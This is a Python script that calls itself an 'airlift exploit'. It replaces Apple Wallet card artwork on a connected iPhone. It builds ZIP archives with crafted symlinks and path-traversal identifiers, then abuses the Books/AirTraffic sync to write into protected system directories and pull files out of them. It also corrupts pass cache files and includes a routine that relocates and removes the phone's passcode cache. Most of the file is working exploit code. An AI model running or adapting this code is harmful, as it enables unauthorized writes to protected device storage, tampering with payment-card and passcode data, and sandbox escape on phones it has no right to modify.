#!/usr/bin/env python3
"""Apply custom card skins to Apple Wallet passes using airlift exploit."""

from __future__ import annotations

import io
import json
import os
import plistlib
import posixpath
import re
import secrets
import stat
import struct
import subprocess
import sys
import tempfile
import time
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
DEVICE_HELPER = ROOT / "bin" / "device_helper" if (ROOT / "bin" / "device_helper").is_file() else ROOT / "build" / "device_helper"
AIRTRAFFIC_HOST = ROOT / "bin" / "airtraffic_host" if (ROOT / "bin" / "airtraffic_host").is_file() else ROOT / "build" / "airtraffic_host"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SOURCE_PREFIX = "airlift-src-"
LINK_PREFIX = "airlift-link-"
RECOVERED_PREFIX = "airlift-recovered-"
SZ_EXTRA_ID = 0x5A53


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_archive_multi(target: str, files: list[tuple[str, bytes]]) -> bytes:
    target_tail = target.lstrip("/")
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            if not component:
                continue
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        for idx, (_leaf, payload) in enumerate(files):
            archive.writestr(zip_info(f"payload_{idx}", stat.S_IFREG | 0o600), payload)
        if files:
            archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), files[0][1])
    return output.getvalue()


class CardReadSyncError(RuntimeError):
    """The phone did not finish the sync used to open the card directory."""


CARD_HASH_RE = re.compile(r"^[-A-Za-z0-9_+=]{16,64}$")
PREFERRED_ARTWORK = (
    "cardBackgroundCombined@3x.png",
    "cardBackgroundCombined@2x.png",
    "cardBackgroundCombined.png",
)
CACHE_ARTWORK = ("FrontFace", "Preview", "PlaceHolder")


def choose_card_artwork(names: list[str]) -> str | None:
    present = set(names)
    for name in PREFERRED_ARTWORK:
        if name in present:
            return name
    ranked: list[tuple[int, str]] = []
    for name in names:
        lower = name.lower()
        if not lower.endswith((".png", ".jpg", ".jpeg")):
            continue
        if any(word in lower for word in ("logo", "icon", "footer", "thumbnail")):
            continue
        score = 0
        if "background" in lower or "strip" in lower:
            score += 2
        if "@3x" in lower:
            score += 1
        ranked.append((score, name))
    if ranked:
        ranked.sort(key=lambda item: (-item[0], item[1]))
        return ranked[0][1]
    if "cardBackgroundCombined.pdf" in present:
        return "cardBackgroundCombined.pdf"
    return None


def image_payload(data: bytes) -> bytes | None:
    if data.startswith(b"\x89PNG") or data.startswith(b"\xff\xd8\xff") or data.startswith(b"%PDF"):
        return data
    return None


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            val = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(val, dict):
            result = val
            break
    if result is None:
        raise RuntimeError(f"{Path(command[0]).name} failed: {completed.stderr}")
    result["exitCode"] = completed.returncode
    return result


def run_json_streaming(command: list[str], timeout: int, on_progress=None) -> dict:
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
    )
    result = None
    try:
        if proc.stdout:
            for line in iter(proc.stdout.readline, ""):
                line_str = line.strip()
                if not line_str:
                    continue
                try:
                    val = json.loads(line_str)
                    if isinstance(val, dict):
                        if val.get("type") == "atc_progress" and on_progress:
                            on_progress(val)
                        result = val
                except json.JSONDecodeError:
                    pass
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        raise TimeoutError(f"{Path(command[0]).name} timed out after {timeout}s")

    if result is None:
        stderr = proc.stderr.read() if proc.stderr else ""
        raise RuntimeError(f"{Path(command[0]).name} failed: {stderr}")
    result["exitCode"] = proc.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def operation_ok(result: dict) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def write_file(udid: str, target: str, leaf: str, payload: bytes, retries: int = 3) -> bool:
    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            payload_identifier = f"../../{source}/payload"

            # Step 1: move link to media
            # Step 2: move new payload into link/leaf (atomically creates or overwrites target)
            identifiers = [link_identifier, payload_identifier]
            destinations = [
                link_destination,
                posixpath.join(link_destination, leaf),
            ]

            with tempfile.TemporaryDirectory(prefix="airlift-write-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive(target, payload))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))
                atc = run_json(atc_cmd, timeout=120)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.3 * attempt)

    return False


def write_files_batch(
    udid: str,
    target: str,
    files: list[tuple[str, bytes]],
    retries: int = 3,
    progress_callback=None,
) -> bool:
    if not files:
        return True

    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            identifiers = [link_identifier]
            destinations = [link_destination]

            for idx, (leaf, _) in enumerate(files):
                identifiers.append(f"../../{source}/payload_{idx}")
                destinations.append(posixpath.join(link_destination, leaf))

            with tempfile.TemporaryDirectory(prefix="airlift-batch-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive_multi(target, files))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))

                timeout = max(120, len(files) * 2)
                if progress_callback:
                    atc = run_json_streaming(atc_cmd, timeout=timeout, on_progress=progress_callback)
                else:
                    atc = run_json(atc_cmd, timeout=timeout)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.4 * attempt)

    return False


PASSCODE_CACHE_VERSIONS = frozenset(("TelephonyUI-8", "TelephonyUI-9", "TelephonyUI-10"))


def clear_passcode_cache(udid: str, version: str) -> tuple[int, str]:
    """Back up and remove one versioned iPhone passcode cache directory."""
    if version not in PASSCODE_CACHE_VERSIONS:
        raise ValueError("Unsupported TelephonyUI cache version")
    if not re.fullmatch(r"[A-Za-z0-9-]{16,80}", udid):
        raise ValueError("Invalid device identifier")

    target = f"/var/mobile/Library/Caches/{version}"
    token = secrets.token_hex(10)
    source = f"{SOURCE_PREFIX}{token}"
    link_destination = f"{LINK_PREFIX}{token}"
    recovered = f"{RECOVERED_PREFIX}{token}"
    rollback_link = f"{LINK_PREFIX}{secrets.token_hex(10)}"
    preserve_name = f"{RECOVERED_PREFIX}{secrets.token_hex(10)}"
    link_identifier = f"../../{source}/p0/p1/p2/link"
    target_identifier = f"../../../../../{target.lstrip('/')}"
    moved_link_identifier = f"../../{link_destination}"
    moved_cache_identifier = f"../../{recovered}"
    backup_dir = (
        Path.home() / "Library" / "Application Support" / "FaceLift"
        / "PasscodeCacheBackups" / udid / version / token
    )

    def remote_kind(name: str) -> str | None:
        result = native("stat-media", udid, name)
        if operation_ok(result):
            return result["operation"].get("st_ifmt")
        return None

    def finish(link_name: str, recovered_name: str, snapshot_root: Path) -> dict:
        return run_json(
            [
                os.fspath(DEVICE_HELPER), "finish-write", udid, source,
                link_name, recovered_name, os.fspath(snapshot_root),
            ],
            timeout=600,
        )

    with tempfile.TemporaryDirectory(prefix="airlift-passcode-reset-") as temporary:
        work = Path(temporary)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        snapshot_root = work / "books-snapshot"
        snapshot_root.mkdir()
        archive_path.write_bytes(build_archive("/var/mobile/Library/Caches", b"facelift-passcode-reset"))
        # Keep both relocated assets in the manifest so a rollback sync can
        # move the cache back without AirTraffic discarding them first.
        books_path.write_bytes(build_books([
            link_identifier, target_identifier,
            moved_link_identifier, moved_cache_identifier,
        ]))

        snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
        if not operation_ok(snapshot):
            raise RuntimeError("Could not save the Books sync state")

        failure: Exception | None = None
        backup_complete = False
        rollback_attempted = False
        backed_up = 0
        try:
            stage = native(
                "stage", udid, source, link_destination, recovered,
                os.fspath(archive_path), os.fspath(books_path), os.fspath(snapshot_root),
            )
            if not operation_ok(stage):
                raise RuntimeError("Could not stage the passcode cache link")

            moved = run_json(
                [
                    os.fspath(AIRTRAFFIC_HOST), udid,
                    link_identifier, link_destination,
                    target_identifier, recovered,
                ],
                timeout=60,
            )
            if moved.get("exitCode") != 0 or not moved.get("ok"):
                reason = moved.get("error") or f"exit code {moved.get('exitCode')}"
                raise RuntimeError(f"Could not move the passcode cache: {reason}")
            if remote_kind(recovered) != "S_IFDIR":
                raise RuntimeError("Passcode cache was not moved into the readable area")

            backup = run_json(
                [
                    os.fspath(DEVICE_HELPER), "backup-passcode-cache", udid,
                    recovered, os.fspath(backup_dir),
                ],
                timeout=600,
            )
            if not operation_ok(backup):
                reason = backup.get("operation", {}).get("reason", "backup failed")
                raise RuntimeError(f"Could not back up the passcode cache: {reason}")
            backed_up = int(backup["operation"].get("backedUp", 0))
            backup_complete = True
        except Exception as exc:
            failure = exc
            try:
                relocated_cache_present = remote_kind(recovered) == "S_IFDIR"
            except Exception as probe_error:
                relocated_cache_present = False
                failure = RuntimeError(f"{exc}; could not inspect relocated cache: {probe_error}")
            if relocated_cache_present:
                rollback_attempted = True
                try:
                    rollback = run_json(
                        [
                            os.fspath(AIRTRAFFIC_HOST), udid,
                            moved_link_identifier, rollback_link,
                            moved_cache_identifier, f"{rollback_link}/{version}",
                        ],
                        timeout=60,
                    )
                    if rollback.get("exitCode") != 0 or not rollback.get("ok") or remote_kind(recovered) == "S_IFDIR":
                        failure = RuntimeError(f"{exc}; cache remains on iPhone at /var/mobile/Media/{recovered}")
                except Exception as rollback_error:
                    failure = RuntimeError(f"{exc}; rollback failed: {rollback_error}; cache remains on iPhone at /var/mobile/Media/{recovered}")
        finally:
            # Never remove an unbacked cache directory. A failed rollback
            # leaves it in Media for manual recovery rather than discarding it.
            discard = recovered if backup_complete else preserve_name
            cleanup_errors = []
            links = [link_destination, rollback_link] if rollback_attempted else [link_destination]
            for link_name in links:
                try:
                    result = finish(link_name, discard, snapshot_root)
                    if not operation_ok(result):
                        cleanup_errors.append(str(result.get("operation", {}).get("failures", "cleanup failed")))
                except Exception as cleanup_error:
                    cleanup_errors.append(str(cleanup_error))
            if cleanup_errors:
                failure = RuntimeError(
                    f"{failure or 'Passcode cache cleanup failed'}; "
                    f"sync cleanup: {', '.join(cleanup_errors)}"
                )

        if failure:
            suffix = f"; Mac backup: {backup_dir}" if backup_complete else ""
            raise RuntimeError(f"{failure}{suffix}")
        return backed_up, os.fspath(backup_dir)


def pass_asset_id(absolute: str) -> str:
    """Books asset id for a file under the Cards directory."""
    prefix = "/var/mobile/Library/Passes/Cards/"
    if not absolute.startswith(prefix) or ".." in absolute:
        raise ValueError(absolute)
    return "../../../../../" + absolute[1:]


def read_card_artwork(udid: str, card_hash: str, dest_path: str) -> str | None:
    """Copy the card face that is already on the iPhone into dest_path.

    The file is moved out only long enough to read it, then written back
    with the same bytes before the temporary copy is deleted.
    """
    if not CARD_HASH_RE.fullmatch(card_hash):
        return None
    directory = f"/var/mobile/Library/Passes/Cards/{card_hash}.pkpass"
    for leaf in (*PREFERRED_ARTWORK, "cardBackgroundCombined.pdf"):
        payload = _borrow_pass_file(udid, f"{directory}/{leaf}")
        if image_payload(payload or b"") is None:
            continue
        _write_preview(payload, Path(dest_path))
        return leaf
    return None


def _borrow_pass_file(udid: str, absolute: str) -> bytes | None:
    asset = pass_asset_id(absolute)
    parent, leaf = absolute.rsplit("/", 1)
    token = secrets.token_hex(10)
    source = f"{SOURCE_PREFIX}{token}"
    link_destination = f"{LINK_PREFIX}{token}"
    recovered = f"{RECOVERED_PREFIX}{token}"
    image_name = f"{RECOVERED_PREFIX}{secrets.token_hex(10)}"
    with tempfile.TemporaryDirectory(prefix="airlift-read-") as temporary:
        work = Path(temporary)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        snapshot_root = work / "books-snapshot"
        snapshot_root.mkdir()
        archive_path.write_bytes(build_archive("/tmp/unused", b"facelift-read"))
        books_path.write_bytes(build_books([
            asset,
            f"../../{source}/payload",
        ]))
        snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
        if not operation_ok(snapshot):
            raise CardReadSyncError("snapshot failed")
        payload = None
        try:
            stage = native(
                "stage",
                udid,
                source,
                link_destination,
                recovered,
                os.fspath(archive_path),
                os.fspath(books_path),
                os.fspath(snapshot_root),
            )
            if not operation_ok(stage):
                raise CardReadSyncError("stage failed")
            books_path.write_bytes(build_books([
                asset,
                image_name,
                f"../../{source}/payload",
                recovered,
            ]))
            if not operation_ok(native("install-books", udid, os.fspath(books_path))):
                raise CardReadSyncError("books install failed")
            moved = run_json(
                [
                    os.fspath(AIRTRAFFIC_HOST),
                    udid,
                    asset,
                    image_name,
                    f"../../{source}/payload",
                    recovered,
                ],
                timeout=40,
            )
            if moved.get("exitCode") != 0 or not moved.get("ok"):
                raise CardReadSyncError(moved.get("error") or "sync failed")
            pulled = work / "borrowed.bin"
            result = native("pull", udid, image_name, os.fspath(pulled))
            if operation_ok(result) and pulled.is_file():
                payload = pulled.read_bytes()
        except subprocess.TimeoutExpired as exc:
            raise CardReadSyncError("sync timed out") from exc
        finally:
            native(
                "finish-write",
                udid,
                source,
                link_destination,
                recovered,
                os.fspath(snapshot_root),
            )
        if payload:
            if not write_file(udid, parent, leaf, payload):
                raise CardReadSyncError("restore failed")
        native("sweep", udid)
        return payload


def _write_preview(payload: bytes, dest: Path) -> None:
    dest.parent.mkdir(parents=True, exist_ok=True)
    if payload.startswith(b"%PDF"):
        with tempfile.TemporaryDirectory(prefix="facelift-preview-") as temporary:
            pdf_path = Path(temporary) / "card.pdf"
            png_path = Path(temporary) / "card.png"
            pdf_path.write_bytes(payload)
            subprocess.run(
                ["/usr/bin/sips", "-s", "format", "png", str(pdf_path), "--out", str(png_path)],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            dest.write_bytes(png_path.read_bytes())
        return
    dest.write_bytes(payload)


def invalidate_cache(udid: str, card_hash: str) -> bool:
    """Invalidates card image cache by corrupting cache leaves in .cache and .pkcache."""
    any_ok = False
    cache_leaves = [("FrontFace", b"corrupted"), ("PlaceHolder", b"corrupted"), ("Preview", b"corrupted")]
    for ext in [".cache", ".pkcache"]:
        cache_dir = f"/var/mobile/Library/Passes/Cards/{card_hash}{ext}"
        try:
            if write_files_batch(udid, cache_dir, cache_leaves):
                any_ok = True
            else:
                for leaf, payload in cache_leaves:
                    if write_file(udid, cache_dir, leaf, payload):
                        any_ok = True
        except Exception:
            pass
    return any_ok


def main():
    if len(sys.argv) < 3:
        print("Usage: apply_card_skin.py <udid> <image_path> [card_hash ...]")
        return
    udid = sys.argv[1]
    img_path = Path(sys.argv[2])
    if not img_path.is_file():
        print(f"Error: {img_path} not found")
        sys.exit(1)
    img_data = img_path.read_bytes()
    hashes = sys.argv[3:]

    print(f"Loaded image from batter: {len(img_data)} bytes")
    print(f"Targeting {len(hashes)} cards on device {udid}...")

    for index, h in enumerate(hashes, 1):
        target_dir = f"/var/mobile/Library/Passes/Cards/{h}.pkpass"
        print(f"\n[{index}/{len(hashes)}] Processing card: {h}")

        print("  -> Writing card artwork (fast batch)...")
        card_assets = [
            ("cardBackgroundCombined@3x.png", img_data),
            ("cardBackgroundCombined@2x.png", img_data),
        ]
        ok_batch = write_files_batch(udid, target_dir, card_assets)
        if not ok_batch:
            ok3x = write_file(udid, target_dir, "cardBackgroundCombined@3x.png", img_data)
            ok2x = write_file(udid, target_dir, "cardBackgroundCombined@2x.png", img_data)
            ok_batch = ok3x and ok2x
        print(f"     Result: {'SUCCESS' if ok_batch else 'FAILED'}")

        print("  -> Invalidating pass cache...")
        ok_cache = invalidate_cache(udid, h)
        print(f"     Result: {'SUCCESS' if ok_cache else 'FAILED (or cache already empty)'}")

    print("\nAll done! Please force close Wallet on your iPhone and reopen it.")


if __name__ == "__main__":
    main()
